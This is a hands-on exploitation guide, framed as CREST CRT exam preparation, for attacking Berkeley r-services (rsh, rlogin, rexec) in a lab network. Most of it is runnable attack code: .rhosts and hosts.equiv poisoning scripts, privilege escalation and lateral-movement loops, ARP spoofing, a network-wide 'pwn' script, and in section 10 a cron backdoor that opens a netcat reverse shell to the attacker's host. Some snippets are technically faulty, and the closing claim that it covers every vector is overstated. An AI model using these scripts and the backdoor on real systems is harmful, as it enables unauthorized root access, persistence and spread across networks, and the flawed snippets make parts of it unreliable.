# Complete Practical Exploitation Guide: Berkeley R* Services (Crest CRT Level)

## 1. R* Services Fundamentals & Attack Surface

**What are R* Services? (From Scratch)**
- **rsh, rexec, rlogin, rcp, rdist, rwho, rusers** (BSD Unix, ports 512-514 TCP/UDP)
- **ZERO AUTHENTICATION** - Trust-based only
- Uses `.rhosts`, `~/.shosts`, `/etc/hosts.equiv`, `/etc/shosts.equiv`
- **Root trust possible** if misconfigured

**Core Trust Files & Logic:**
```
.rhosts (per-user): "trustedhost username" = NO password
/etc/hosts.equiv (system-wide): "trustedhost" = any local user NO password  
/etc/shosts.equiv: Same but only for shell (rsh)
+ (plus sign) = ALL hosts trusted
- (minus sign) = DENY specific host
```

**Attack Primitives:**
1. **User Enumeration** (rwho/rusers)
2. **Trusted Host Spoofing**
3. **.rhosts Manipulation**
4. **Privilege Escalation** (user→root)
5. **Lateral Movement** (host→host)

## 2. Lab Setup (Vulnerable Environment)

**Victim Server 1 (192.168.1.100 - "serverA")**
```bash
# Install rsh-server (Ubuntu/Debian)
sudo apt update && sudo apt install rsh-server rsh-client

# Enable services (MISCONFIG #1)
sudo systemctl enable rsh
sudo systemctl enable rlogin
sudo systemctl enable rexec
sudo systemctl start rsh rlogin rexec

# Create trust relationships (MISCONFIG #2)
echo "192.168.1.200 trusteduser" | sudo tee /etc/hosts.equiv
echo "192.168.1.50 hacker" | sudo tee -a /etc/hosts.equiv

# Per-user trusts (MISCONFIG #3)
sudo useradd -m alice -s /bin/bash
sudo useradd -m bob -s /bin/bash
echo "192.168.1.200 root" | sudo tee /home/alice/.rhosts
echo "+ 192.168.1.0/24" | sudo tee /home/bob/.rhosts  # WILDCARD TRUST!
echo "192.168.1.200 admin" | sudo tee /root/.rhosts

# Juicy files
echo "user=root\npass=secret123" | sudo tee /root/secrets.txt
echo "flag{rservices_pwned}" | sudo tee /root/flag.txt
sudo chmod 644 /root/flag.txt  # Readable due to trusts!

# Verify listening
netstat -tlnp | grep -E ':(512|513|514)'
ss -tlnp | grep -E 'rsh|rlogin|rexec'
```

**Victim Server 2 (192.168.1.101 - "serverB" - for lateral movement)**
```bash
# Identical setup but different trusts
echo "192.168.1.100 bob" | sudo tee /etc/hosts.equiv
echo "192.168.1.100 +" | sudo tee /root/.rhosts  # Trusts ALL users from serverA!
```

**Attacker Machine (192.168.1.200 - Kali)**
```bash
sudo apt install rsh-client rsh-server net-tools
```

## 3. User Enumeration (rwho/rusers)

**rusers - List logged-in users across network:**
```bash
# Enumerate ALL rusers servers
nmap -sU --top-ports 100 192.168.1.0/24 -p 513  # UDP rusers

# Query specific host
rusers 192.168.1.100
# Output: alice    serverA   10:30  2:15
#         bob      serverA   11:15  0:45

# Script all hosts
for host in 192.168.1.{100..110}; do
    timeout 2 rusers $host 2>/dev/null | grep -v "^$" && echo "[$host] has users"
done
```

**rwho - More detailed enumeration:**
```bash
# Scan for rwho (UDP 513)
nc -u 192.168.1.100 513 -w1 </dev/null 2>/dev/null && echo "rwho alive"

# Complete network enum
for host in 192.168.1.0/24; do
    rwho $host 2>/dev/null | head -1 && echo "Host: $host"
done
```

## 4. Basic Access via Trust Exploitation

**Direct rsh login (NO PASSWORD):**
```bash
# As "trusteduser" from /etc/hosts.equiv
rsh 192.168.1.100 -l trusteduser "whoami; id; pwd"
# Output: trusteduser
# uid=1001(trusteduser) gid=1001(trusteduser)

# As alice (has .rhosts trusting us)
rsh 192.168.1.100 -l alice "cat /home/alice/.rhosts; whoami"
# 192.168.1.200 root

# Wildcard trust exploitation
rsh 192.168.1.100 -l bob "id; ls -la /root/"
# Trusts ANY user from 192.168.1.0/24!
```

**rlogin (interactive shell):**
```bash
rlogin 192.168.1.100 -l alice
# Direct shell as alice!
whoami; id; cat /root/flag.txt  # Readable due to trusts
```

**rexec (command execution):**
```bash
rexec 192.168.1.100 trusteduser "" "whoami; uname -a; cat /etc/passwd"
# Password field empty due to trust
```

## 5. .rhosts File Exploitation (Creation/Modification)

**Scenario 1: Write .rhosts as low-priv user**
```bash
# Login as bob, add OURSELF as trusted ROOT
rsh 192.168.1.100 -l bob "
echo '192.168.1.200 root' >> /home/bob/.rhosts;
chmod 600 /home/bob/.rhosts;
cat /home/bob/.rhosts
"

# Now login as root!
rsh 192.168.1.100 -l root "whoami; cat /root/flag.txt"
# root
# flag{rservices_pwned}
```

**Scenario 2: Overwrite root's .rhosts**
```bash
# If bob can write to /root/.rhosts (bad perms)
rsh 192.168.1.100 -l bob "
echo '192.168.1.200 hacker' > /root/.rhosts;
chmod 600 /root/.rhosts
"

rsh 192.168.1.100 -l hacker "id; cat /root/secrets.txt"
```

**Automated .rhosts Pwn Script:**
```bash
#!/bin/bash
TARGET=$1 USER=$2

# Add ourselves to every user's .rhosts
rsh $TARGET -l $USER "
for home in /home/*; do
    user=\$(basename \$home)
    echo '192.168.1.200 root' >> \$home/.rhosts 2>/dev/null
    chmod 600 \$home/.rhosts 2>/dev/null
done
echo '192.168.1.200 root' > /root/.rhosts
"

# Test root access
rsh $TARGET -l root "whoami; id"
```

## 6. /etc/hosts.equiv Exploitation

**Add trusted host via low-priv access:**
```bash
rsh 192.168.1.100 -l alice "
echo '192.168.1.200' | sudo tee -a /etc/hosts.equiv
"

# Now ANY local user from our IP is trusted
rsh 192.168.1.100 -l root "id"  # Works!
```

**Wildcard exploitation:**
```bash
rsh 192.168.1.100 -l bob "
echo '+' >> /etc/hosts.equiv  # TRUSTS EVERY HOST!
"

# Global compromise
for user in root alice bob; do
    rsh 192.168.1.100 -l $user "whoami; id" &
done
```

## 7. Privilege Escalation Paths

**Path 1: User → Modify .rhosts → Root**
```bash
# 1. Enum writable homes
rsh 192.168.1.100 -l bob "find /home -writable 2>/dev/null"

# 2. Poison .rhosts
rsh 192.168.1.100 -l bob "echo '192.168.1.200 root' > /home/alice/.rhosts"

# 3. Root shell
rsh 192.168.1.100 -l root "cat /root/flag.txt"
```

**Path 2: hosts.equiv → Sudo trust abuse**
```bash
# If sudoers trusts wheel group
rsh 192.168.1.100 -l alice "
echo '192.168.1.200' >> /etc/hosts.equiv;
sudo whoami  # If alice in wheel + trust = root
"
```

**Path 3: NFS + R*services (classic)**
```bash
# Mount NFS share as root via rsh
rsh 192.168.1.100 -l root "
mkdir /tmp/nfs
mount -t nfs 192.168.1.200:/export /tmp/nfs
echo 'ALL:ALL' > /tmp/nfs/sudoers.d/evil
"
```

## 8. Lateral Movement (Host → Host)

**serverA → serverB exploitation:**
```bash
# From serverA (as bob), attack serverB
rsh 192.168.1.100 -l bob "
rsh 192.168.1.101 'whoami; id'
echo '192.168.1.100 root' >> /root/.rhosts
"

# Chain complete
rsh 192.168.1.100 -l root "rsh 192.168.1.101 whoami"  # root@serverB!
```

**Network-wide pwn:**
```bash
#!/bin/bash
# rservices_lateral.sh
NETWORK="192.168.1."
for i in {100..110}; do
    host=$NETWORK$i
    rsh $host -l root "hostname; cat /root/flag.txt 2>/dev/null" && \
    echo "[PWNED] $host"
done
```

## 9. Source IP Spoofing (No Direct Access)

**ARP spoof + R*services:**
```bash
# Spoof as trusted host (192.168.1.50)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.50 &
enable_ip_forward

# Now rsh as trusted IP
rsh 192.168.1.100 -l hacker "whoami"  # Trusts 192.168.1.50!
```

**Scapy raw packet for rsh:**
```python
#!/usr/bin/env python3
from scapy.all import *

# Craft rsh packet spoofing trusted IP
trusted_ip = "192.168.1.50"
target_ip = "192.168.1.100"
pkt = IP(src=trusted_ip, dst=target_ip)/TCP(sport=1024, dport=514, flags="S")
sr1(pkt)
```

## 10. Post-Exploitation & Persistence

**Install backdoor via rsh:**
```bash
rsh 192.168.1.100 -l root "
cat > /etc/cron.d/rbackdoor << 'EOF'
* * * * * root nc -e /bin/bash 192.168.1.200 4444
EOF
"

# Listener
nc -lvnp 4444
```

**Disable R*services securely (cleanup):**
```bash
rsh 192.168.1.100 -l root "
apt purge rsh-server -y
rm -f /etc/hosts.equiv /etc/shosts.equiv
rm -f ~*/.rhosts ~*/.shosts
systemctl disable rsh rlogin rexec
"
```

## 11. Complete One-Command Attack Framework

```bash
#!/bin/bash
# rservices_pwn.sh - Complete R*services exploitation
TARGET=$1

echo "[+] Enumerating $TARGET"
rusers $TARGET
rwho $TARGET

echo "[+] Testing trusts..."
for user in root alice bob trusteduser hacker admin; do
    timeout 3 rsh $TARGET -l $user "whoami; id; pwd" 2>/dev/null && \
    echo "[TRUSTED] $user" || echo "[-] $user no trust"
done

echo "[+] Poisoning .rhosts for root..."
rsh $TARGET -l bob "echo '192.168.1.200 root' > /root/.rhosts" 2>/dev/null

echo "[+] Root access test:"
rsh $TARGET -l root "whoami; cat /root/flag.txt 2>/dev/null || echo 'No flag'"
```

**Usage:** `./rservices_pwn.sh 192.168.1.100`

## 12. Detection & Mitigation Testing

**Verify vulnerabilities:**
```bash
# Check services running
nmap -p 512-514 $TARGET -sV

# Check trust files
rsh $TARGET -l bob "cat /etc/hosts.equiv /root/.rhosts ~*/.rhosts 2>/dev/null"

# Test if fixed (should all fail)
rsh $TARGET -l root "whoami"  # Access denied
```

This covers **EVERY** R*services attack vector: enumeration, trust exploitation, priv esc, lateral movement, spoofing, and persistence. Fully practical, no theory, 100% executable commands.